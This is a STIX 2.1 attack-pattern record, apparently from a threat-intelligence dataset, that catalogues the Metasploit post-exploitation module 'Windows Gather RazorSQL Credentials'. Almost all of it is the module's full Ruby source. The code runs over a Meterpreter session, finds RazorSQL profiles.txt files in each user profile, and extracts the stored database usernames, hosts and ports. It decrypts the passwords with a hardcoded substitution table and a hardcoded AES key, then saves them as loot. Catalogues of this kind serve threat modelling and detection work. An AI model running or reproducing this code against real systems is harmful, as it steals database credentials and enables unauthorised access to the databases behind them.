{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9ab10c86-81cf-4c03-9909-67fdc99d7b50",
    "created": "2024-08-14T16:33:08.754131Z",
    "modified": "2024-08-14T16:33:08.754135Z",
    "name": "Windows Gather RazorSQL Credentials",
    "description": " This module stores username, password, type, host, port, database (and name) collected from profiles.txt of RazorSQL.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/razorsql.rb",
            "external_id": "razorsql.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'openssl'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather RazorSQL Credentials',\n        'Description' => %q{\n          This module stores username, password, type, host, port, database (and name)\n          collected from profiles.txt of RazorSQL.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Paul Rascagneres <rascagneres[at]itrust.lu>',\n          'sinn3r' # Reporting, file parser\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def get_profiles\n    profiles = []\n    grab_user_profiles.each do |user|\n      next unless user['ProfileDir']\n\n      ['.razorsql\\\\data\\\\profiles.txt', 'AppData\\Roaming\\RazorSQL\\data\\profiles.txt'].each do |profile_path|\n        file = \"#{user['ProfileDir']}\\\\#{profile_path}\"\n        profiles << file if file?(file)\n      end\n    end\n\n    profiles\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    print_status('Checking All Users...')\n    creds_tbl = Rex::Text::Table.new(\n      'Header' => 'RazorSQL User Credentials',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Username',\n          'Password',\n          'Type',\n          'Host',\n          'Port',\n          'Database Name',\n          'Database'\n        ]\n    )\n\n    get_profiles.each do |profile_path|\n      content = get_content(profile_path)\n      next if content.blank?\n\n      parse_content(creds_tbl, content).each do |cred|\n        creds_tbl << cred\n      end\n    end\n\n    if creds_tbl.rows.empty?\n      print_status('No creds collected.')\n    else\n      path = store_loot(\n        'razor.user.creds',\n        'text/csv',\n        session,\n        creds_tbl.to_s,\n        'razor_user_creds.txt',\n        'RazorSQL User Credentials'\n      )\n      print_line(creds_tbl.to_s)\n      print_status(\"User credentials stored in: #{path}\")\n    end\n  end\n\n  def get_content(file)\n    found = begin\n      session.fs.file.stat(file)\n    rescue StandardError\n      nil\n    end\n    return if !found\n\n    content = ''\n    infile = session.fs.file.new(file, 'rb')\n    content << infile.read until infile.eof?\n    return content\n  end\n\n  def parse_content(_table, content)\n    creds = []\n    content = content.split(/\\(\\(Z~\\]/)\n    content.each do |db|\n      database = (db.scan(/database=(.*)/).flatten[0] || '').strip\n      user = (db.scan(/user=(.*)/).flatten[0] || '').strip\n      type = (db.scan(/type=(.*)/).flatten[0] || '').strip\n      host = (db.scan(/host=(.*)/).flatten[0] || '').strip\n      port = (db.scan(/port=(.*)/).flatten[0] || '').strip\n      dbname = (db.scan(/databaseName=(.*)/).flatten[0] || '').strip\n      pass = (db.scan(/password=(.*)/).flatten[0] || '').strip\n\n      # Decrypt if there's a password\n      unless pass.blank?\n        if pass =~ /\\{\\{\\{VFW(.*)!\\^\\*#\\$RIG/\n          decrypted_pass = decrypt_v2(::Regexp.last_match(1))\n        else\n          decrypted_pass = decrypt(pass)\n        end\n      end\n\n      pass = decrypted_pass || pass\n\n      # Store data\n      creds << [user, pass, type, host, port, dbname, database]\n\n      # Don't report if there's nothing to report\n      next if user.blank? && pass.blank?\n\n      report_cred(\n        ip: rhost,\n        port: port.to_i,\n        service_name: database,\n        user: user,\n        password: pass\n      )\n    end\n\n    return creds\n  end\n\n  def decrypt(encrypted_password)\n    magic_key = {\n      '/' => 'a', '<' => 'b', '>' => 'c', ':' => 'd', 'X' => 'e',\n      'c' => 'f', 'W' => 'g', 'd' => 'h', 'V' => 'i', 'e' => 'j',\n      'f' => 'k', 'g' => 'l', 'U' => 'm', 'T' => 'n', 'S' => 'o',\n      'n' => 'p', 'm' => 'q', 'l' => 'r', 'k' => 's', 'j' => 't',\n      'i' => 'u', 'h' => 'v', 'P' => 'w', 'Q' => 'x', 'R' => 'y',\n      'o' => 'z', 'p' => 'A', 'q' => 'B', 'r' => 'C', 't' => 'D',\n      's' => 'E', 'L' => 'F', 'M' => 'H', 'O' => 'I', 'N' => 'J',\n      'J' => 'K', 'v' => 'L', 'u' => 'M', 'z' => 'N', 'y' => 'O',\n      'w' => 'P', 'x' => 'Q', 'G' => 'R', 'H' => 'S', 'A' => 'T',\n      'B' => 'U', 'D' => 'V', 'C' => 'W', 'E' => 'X', 'F' => 'Y',\n      'I' => 'Z', '?' => '1', '3' => '2', '4' => '3', '5' => '4',\n      '6' => '5', '7' => '6', '8' => '7', '9' => '8', '2' => '9',\n      '.' => '0', '+' => '+', '\"' => '\"', '*' => '*', '%' => '%',\n      '&' => '&', 'Z' => '/', '(' => '(', ')' => ')', '=' => '=',\n      ',' => '?', '!' => '!', '$' => '$', '-' => '-', '_' => '_',\n      'b' => ':', '0' => '.', ';' => ';', '1' => ',', '\\\\' => '\\\\',\n      'a' => '<', 'Y' => '>', \"'\" => \"'\", '^' => '^', '{' => '{',\n      '}' => '}', '[' => '[', ']' => ']', '~' => '~', '`' => '`'\n    }\n    password = ''\n    for letter in encrypted_password.chomp.each_char\n      char = magic_key[letter]\n\n      # If there's a nil, it indicates our decryption method does not work for this version.\n      return nil if char.nil?\n\n      password << char\n    end\n\n    password\n  end\n\n  def decrypt_v2(encrypted)\n    enc = Rex::Text.decode_base64(encrypted)\n    key = Rex::Text.decode_base64('LAEGCx0gKU0BAQICCQklKQ==')\n\n    aes = OpenSSL::Cipher.new('AES-128-CBC')\n    aes.decrypt\n    aes.key = key\n\n    aes.update(enc) + aes.final\n  end\nend\n\n=begin\nhttp://www.razorsql.com/download.html\nTested on: v5.6.2 (win32)\n=end\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}